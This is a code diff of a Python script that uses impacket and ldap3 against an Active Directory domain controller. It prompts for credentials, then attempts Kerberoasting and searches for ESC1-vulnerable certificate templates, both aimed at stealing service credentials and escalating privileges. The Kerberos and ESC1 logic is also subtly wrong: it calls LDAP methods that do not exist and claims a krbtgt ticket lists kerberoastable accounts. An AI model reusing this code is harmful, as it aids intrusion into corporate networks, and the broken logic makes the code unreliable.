@@ -5,59 +5,38 @@ from impacket.krb5.asn1 import AP_REQ, TGS_REQ
 from impacket.krb5.types import Principal, KerberosTime, Ticket
 from impacket.ntlm import compute_lmhash, compute_nthash
 
-def discover_domain_controllers(domain):
+def kerberoast(domain, username, password, dc_ip):
     try:
-        srv_records = dns.resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
-        domain_controllers = []
+        print(f"Attempting to Kerberoast accounts from {dc_ip}")
 
-        for record in srv_records:
-            domain_controller = {
-                'hostname': str(record.target).rstrip('.'),
-                'port': record.port,
-            }
-            domain_controllers.append(domain_controller)
-
-        return domain_controllers
-
-    except Exception as e:
-        print(f"Error while discovering domain controllers: {e}")
-        return []
-
-def kerberoast(domain, username, password, domain_controllers):
-    try:
-        for dc in domain_controllers:
-            print(f"Attempting to Kerberoast accounts from {dc['hostname']}")
-
-            target = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            krbtgt_ticket = get_ticket(username, password, domain, target, dc['hostname'], dc['port'])
+        target = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        krbtgt_ticket = get_ticket(username, password, domain, target, dc_ip)
+        
+        if krbtgt_ticket:
+            print("Successfully obtained krbtgt ticket.")
             
-            if krbtgt_ticket:
-                print("Successfully obtained krbtgt ticket.")
-                
-                # Extract usernames of kerberoastable accounts from the TGT
-                kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
-                if kerberoastable_accounts:
-                    print("Kerberoastable Accounts:")
-                    for account in kerberoastable_accounts:
-                        print(account)
-                else:
-                    print("No kerberoastable accounts found.")
+            # Extract usernames of kerberoastable accounts from the TGT
+            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
+            if kerberoastable_accounts:
+                print("Kerberoastable Accounts:")
+                for account in kerberoastable_accounts:
+                    print(account)
             else:
-                print("Failed to obtain krbtgt ticket.")
+                print("No kerberoastable accounts found.")
+        else:
+            print("Failed to obtain krbtgt ticket.")
 
     except Exception as e:
         print(f"Error while Kerberoasting: {e}")
 
-def get_ticket(username, password, domain, target, hostname, port):
+def get_ticket(username, password, domain, target, dc_ip):
     try:
-        # Connect to the DC
-        server = ldap3.Server(hostname, port=port, get_info=ldap3.ALL)
+        server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
         conn = ldap3.Connection(server, user=username, password=password)
         if not conn.bind():
-            print(f"Failed to authenticate with provided credentials to {hostname}.")
+            print(f"Failed to authenticate with provided credentials to {dc_ip}.")
             return None
 
-        # Create AP-REQ message
         ccache = conn.toTGT(username, password, domain)
         creds = ccache.credentials[0]
         ap_req = AP_REQ()
@@ -67,21 +46,19 @@ def get_ticket(username, password, domain, target, hostname, port):
         ap_req['ticket'] = creds.ticket
         ap_req['authenticator'] = creds.ticket.authenticator
 
-        # Send TGS request for krbtgt ticket
         tgs_req = TGS_REQ()
         tgs_req['pvno'] = 5
         tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
         tgs_req['padata'] = []
         tgs_req['req-body'] = {
-            'kdc-options': 8,  # canonicalize
+            'kdc-options': 8,
             'sname': target,
             'realm': domain,
             'till': KerberosTime(0),
-            'etype': [23, 17, 18],  # RC4_HMAC, AES256, AES128
+            'etype': [23, 17, 18],
         }
         tgs_req['req-body']['cname'] = creds.ticket['cname']
 
-        # Send TGS request and get krbtgt ticket
         conn.request(target, tgs_req)
         response = conn.response
         if response and len(response) > 0:
@@ -111,32 +88,39 @@ def extract_kerberoastable_accounts(tgt):
         print(f"Error while extracting kerberoastable accounts: {e}")
         return []
 
-def find_esc1_certificate_templates(username, password, domain, domain_controllers):
+def find_esc1_certificate_templates(username, password, domain, dc_ip):
     try:
-        for dc in domain_controllers:
-            server = ldap3.Server(dc['hostname'], port=dc['port'], get_info=ldap3.ALL)
-            conn = ldap3.Connection(server, user=username, password=password)
-            if not conn.bind():
-                print(f"Failed to authenticate with provided credentials to {dc['hostname']}.")
-                continue
+        server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
+        conn = ldap3.Connection(server, user=username, password=password)
+        if not conn.bind():
+            print(f"Failed to authenticate with provided credentials to {dc_ip}.")
+            return
 
-            search_base = 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.'))
-            search_filter = '(&(objectClass=pKICertificateTemplate)(!(name=DomainControllerAuthentication))(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.11141852.2904762.4056951.8883555.2409484.547.1.2))'
-            attributes = ['displayName']
-            
-            conn.search(search_base=search_base,
-                        search_filter=search_filter,
-                        search_scope=ldap3.SUBTREE,
-                        attributes=attributes)
+        search_base = 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.'))
+        search_filter = '(&(objectClass=pKICertificateTemplate)(!(name=DomainControllerAuthentication))(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.11141852.2904762.4056951.8883555.2409484.547.1.2))'
+        attributes = ['displayName']
+        
+        conn.search(search_base=search_base,
+                    search_filter=search_filter,
+                    search_scope=ldap3.SUBTREE,
+                    attributes=attributes)
 
-            if conn.entries:
-                print(f"ESC1 certificate templates found on {dc['hostname']} that meet the criteria:")
-                for entry in conn.entries:
-                    print(entry.displayName.value)
-            else:
-                print(f"No ESC1 certificate templates found on {dc['hostname']}.")
+        if conn.entries:
+            print(f"ESC1 certificate templates found on {dc_ip} that meet the criteria:")
+            for entry in conn.entries:
+                print(entry.displayName.value)
+        else:
+            print(f"No ESC1 certificate templates found on {dc_ip}.")
 
     except Exception as e:
         print(f"Error while searching for ESC1 certificate templates: {e}")
 
+# Example usage:
+username = input("Enter username: ")
+password = input("Enter password: ")
+domain = input("Enter domain: ")
+dc_ip = input("Enter domain controller IP or hostname: ")
+
+kerberoast(domain, username, password, dc_ip)
+find_esc1_certificate_templates(username, password, domain, dc_ip)
 
